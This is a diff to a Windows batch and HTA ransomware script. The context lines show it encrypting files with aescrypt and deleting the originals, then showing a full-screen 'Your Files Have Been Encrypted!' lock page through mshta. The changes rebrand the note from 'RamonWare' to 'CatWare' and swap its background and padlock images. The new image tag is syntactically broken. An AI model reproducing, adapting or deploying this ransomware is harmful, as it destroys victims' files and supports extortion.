@@ -15,8 +15,6 @@ aescrypt -e -p %pass% "%%X"
 del "%%X"
 )
 
-
-
 REM Block Screen
 cls
 setlocal
@@ -40,12 +38,17 @@ for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"
             padding-top: 19%;
             letter-spacing: 1px;
             text-align: center;
-        }
+			}
     </style>
+	<style> 
+	body {
+  background-image: url("https://th.bing.com/th/id/OIP.Grib2LKO5l2Tqkik6f0RewHaE6?pid=ImgDet&rs=1");
+}
+</style> 
+<body scroll="no">
 </head>
-<body bgcolor="#8c1d1d" scroll="no">
     <font face="Lucida Console" size="4" color="white">
-<center><p> - RamonWare Crypt - </p></center>
+<center><p> - CatWare Crypt - </p></center>
 <div id="texto2">
     Oops, Your Files Have Been Encrypted!<br>
     <br><br>
@@ -53,7 +56,7 @@ for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"
     <br><br>
     No Escape <br>
     <br><br><br>
-    <img id="imagen" alt="Candado" src="https://i.imgur.com/rytGPFG.png" height="130" width="100">
+    <img id="imagen" alt="Candado" src="url("https://tse2.mm.bing.net/th?id=OIP.URVCbAexfcYxjGpEoGKpqQHaHa&pid=Api&P=0&h=180") >
 </div>
 </body>
 </html>
